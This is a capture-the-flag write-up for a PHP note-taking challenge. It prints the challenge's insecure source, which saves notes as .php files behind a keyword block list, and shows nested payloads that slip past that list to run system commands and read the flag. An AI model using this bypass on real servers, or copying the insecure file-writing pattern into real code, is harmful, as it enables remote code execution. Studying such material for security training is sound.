# PHat Pottomed Girls

> Tags: web, php  

## Challenge Description

![image](https://user-images.githubusercontent.com/56489087/139527309-ee0b8d13-c9a3-4754-8964-348076f03130.png)

## Target

We can see the the website is just a note creating site that contain links to notes in a php file format. If they are saved in PHP that means we can use PHP to execute code. 

![image](https://user-images.githubusercontent.com/56489087/139527977-b20ce664-e0bd-4232-8aba-fa420a6dce55.png)

![image](https://user-images.githubusercontent.com/56489087/139559842-f00282c3-e56e-473d-aad1-764fbd0cf87e.png)


## Addnote.php

File provided in challenge.

```php
<?php
session_start();

function generateRandomString($length = 15) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function filter($originalstring)
{
    $notetoadd = str_replace("<?php", "", $originalstring);
    $notetoadd = str_replace("?>", "", $notetoadd);
    $notetoadd = str_replace("<?", "", $notetoadd);
    $notetoadd = str_replace("flag", "", $notetoadd);

    $notetoadd = str_replace("fopen", "", $notetoadd);
    $notetoadd = str_replace("fread", "", $notetoadd);
    $notetoadd = str_replace("file_get_contents", "", $notetoadd);
    $notetoadd = str_replace("fgets", "", $notetoadd);
    $notetoadd = str_replace("cat", "", $notetoadd);
    $notetoadd = str_replace("strings", "", $notetoadd);
    $notetoadd = str_replace("less", "", $notetoadd);
    $notetoadd = str_replace("more", "", $notetoadd);
    $notetoadd = str_replace("head", "", $notetoadd);
    $notetoadd = str_replace("tail", "", $notetoadd);
    $notetoadd = str_replace("dd", "", $notetoadd);
    $notetoadd = str_replace("cut", "", $notetoadd);
    $notetoadd = str_replace("grep", "", $notetoadd);
    $notetoadd = str_replace("tac", "", $notetoadd);
    $notetoadd = str_replace("awk", "", $notetoadd);
    $notetoadd = str_replace("sed", "", $notetoadd);
    $notetoadd = str_replace("read", "", $notetoadd);
    $notetoadd = str_replace("system", "", $notetoadd);

    return $notetoadd;
}

if(isset($_POST["notewrite"]))
{
    $newnote = $_POST["notewrite"];

    //3rd times the charm and I've learned my lesson. Now I'll make sure to filter more than once :)
    $notetoadd = filter($newnote);
    $notetoadd = filter($notetoadd);
    $notetoadd = filter($notetoadd);

    $filename = generateRandomString();
    array_push($_SESSION["notes"], "$filename.php");
    file_put_contents("$filename.php", $notetoadd);
    header("location:index.php");
}
?>
```

We can see that the filter function is being used on our payload 3 times. Because it search out and replaces it with nothing, it closes the gaps within our payload. After some testing  we came up with this payload.

> <<<<????php ssssystemystemystemystem("ls"); ????>>>>

It will progress in such a way that the last payload left will evaluate to:

```php
<?php system("ls"); ?>
```

This command will allow us to read the contents of the root directory.

We can then find the name of the flag file and read its contents.

> <<<<????php ssssystemystemystemystem("ccccatatatat fffflaglaglaglag.php"); ????>>>>
```php
<?php system("cat flag.php"); ?>
```

![image](https://user-images.githubusercontent.com/56489087/139528082-7b83b53e-8123-4fec-97a7-6c659a64d35a.png)

